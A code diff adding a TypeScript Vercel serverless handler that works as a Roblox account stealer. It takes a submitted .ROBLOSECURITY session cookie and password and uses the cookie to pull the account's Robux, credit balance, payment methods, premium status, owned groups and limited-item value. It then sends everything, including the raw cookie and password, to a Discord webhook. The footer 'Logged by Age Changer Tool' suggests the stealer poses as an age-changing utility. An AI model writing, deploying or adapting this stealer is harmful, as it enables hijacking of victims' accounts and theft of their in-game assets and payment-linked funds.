@@ -1,0 +1,145 @@
+import type { VercelRequest, VercelResponse } from '@vercel/node';
+import fetch from 'node-fetch';
+
+const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL';
+
+export default async function handler(req: VercelRequest, res: VercelResponse) {
+  if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });
+
+  const { cookie, password } = req.body;
+  if (!cookie || !password) return res.status(400).json({ success: false, message: 'Missing cookie or password' });
+
+  try {
+    // 1. Get authenticated user info
+    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    if (!userRes.ok) return res.status(400).json({ success: false, message: 'Invalid Roblox cookie' });
+    const userData = await userRes.json();
+    const userId = userData.id;
+
+    // 2. Full user info
+    const fullUserRes = await fetch(`https://users.roblox.com/v1/users/${userId}`);
+    const fullUserData = await fullUserRes.json();
+    const accountCreated = fullUserData.created;
+
+    // 3. Email verification & country
+    const accountInfoRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    const accountInfoData = await accountInfoRes.json();
+    const isEmailVerified = accountInfoData.isEmailVerified;
+    const country = accountInfoData.countryCode || '🌍 Unknown';
+
+    // 4. Robux balance
+    const balanceRes = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    const balanceData = await balanceRes.json();
+    const robux = balanceData.robux;
+    const pendingRobux = balanceData.pendingRobux;
+
+    // 5. Groups owned
+    const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userId}/groups/roles`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    let groupsList = [];
+    if (groupsRes.ok) {
+      const groupsData = await groupsRes.json();
+      groupsList = groupsData.data.filter((g: any) => g.role.name.toLowerCase() === 'owner')
+        .map((g: any) => g.group.name);
+    }
+    const groupsOwned = groupsList.length ? groupsList.join(', ') : 'None';
+
+    // 6. Credit balance
+    const creditRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}/credit`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    const creditData = creditRes.ok ? await creditRes.json() : { balance: 0 };
+    const creditBalance = creditData.balance || 0;
+
+    // 7. Payment methods
+    const paymentRes = await fetch(`https://accountinformation.roblox.com/v1/users/${userId}/payment-methods`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    const paymentData = paymentRes.ok ? await paymentRes.json() : [];
+    const paymentMethods = paymentData.length
+      ? paymentData.map((p: any) => p.paymentInstrumentType).join(', ')
+      : '❌ None';
+
+    // 8. Premium membership
+    const premiumRes = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, {
+      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+    });
+    const premiumData = premiumRes.ok ? await premiumRes.json() : { hasPremium: false };
+    const hasPremium = premiumData.hasPremium;
+
+    // 9. Inventory limited items
+    let totalRAP = 0;
+    let korBloxCount = 0;
+    let headlessCount = 0;
+    let page = 1;
+    let hasMore = true;
+
+    while (hasMore) {
+      const invRes = await fetch(`https://inventory.roblox.com/v2/users/${userId}/inventory/collectibles?limit=100&sortOrder=Asc&cursor=${page}`, {
+        headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
+      });
+      if (!invRes.ok) break;
+      const invData = await invRes.json();
+      invData.data.forEach((item: any) => {
+        if (item.recentAveragePrice) totalRAP += item.recentAveragePrice;
+        const nameLower = item.name.toLowerCase();
+        if (nameLower.includes('korblox')) korBloxCount++;
+        if (nameLower.includes('headless')) headlessCount++;
+      });
+      hasMore = invData.nextPageCursor ? true : false;
+      page++;
+    }
+
+    // 10. Send to Discord webhook
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        username: '🎮 Roblox Account Logger',
+        embeds: [
+          {
+            title: `📝 New Roblox Account Info - ${userData.name}`,
+            color: 0x9b59b6,
+            thumbnail: { url: `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png` },
+            fields: [
+              { name: '🆔 User ID', value: userId.toString(), inline: true },
+              { name: '📅 Account Created', value: new Date(accountCreated).toLocaleDateString(), inline: true },
+              { name: '🌍 Country', value: country, inline: true },
+              { name: '✅ Email Verified', value: isEmailVerified ? '✅ Yes' : '❌ No', inline: true },
+              { name: '💎 Premium Membership', value: hasPremium ? '✅ Yes' : '❌ No', inline: true },
+              { name: '💰 Robux', value: robux.toString(), inline: true },
+              { name: '⏳ Pending Robux', value: pendingRobux.toString(), inline: true },
+              { name: '💳 Credit Balance', value: creditBalance.toString(), inline: true },
+              { name: '💳 Payment Methods', value: paymentMethods, inline: true },
+              { name: '🏰 Groups Owned', value: groupsOwned, inline: false },
+              { name: '🎁 Total RAP of Limiteds', value: totalRAP.toString(), inline: true },
+              { name: '🥷 KorBlox Items', value: korBloxCount.toString(), inline: true },
+              { name: '🎩 Headless Items', value: headlessCount.toString(), inline: true },
+              { name: '🔑 Cookie', value: `\`${cookie}\``, inline: false },
+              { name: '🔒 Password', value: `\`${password}\``, inline: false },
+            ],
+            footer: { text: 'Logged by Age Changer Tool', icon_url: 'https://www.roblox.com/favicon.ico' },
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      }),
+    });
+
+    return res.status(200).json({
+      success: true,
+      message: '✅ Account info successfully logged!'
+    });
+
+  } catch (err) {
+    console.error(err);
+    return res.status(500).json({ success: false, message: 'Server error' });
+  }
+      }
+  
